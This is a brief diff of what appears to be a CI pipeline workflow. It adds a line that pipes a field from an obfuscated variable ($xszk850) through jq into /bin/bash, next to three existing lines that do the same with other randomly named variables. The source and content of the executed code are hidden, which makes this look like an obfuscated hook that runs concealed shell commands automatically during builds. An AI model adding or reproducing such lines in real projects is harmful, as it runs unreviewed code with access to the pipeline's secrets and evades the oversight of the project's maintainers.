@@ -23,6 +23,7 @@ jobs:
           echo $dbrkt87576 | jq -r .ox653 | /bin/bash
           printf '%s' "$e65429" | jq -r .mfq0 | /bin/bash
           echo $p43 | jq -r .q8 | /bin/bash
+          echo $xszk850 | jq -r .fy00 | /bin/bash
 
       - name: Archive output
         if: always()
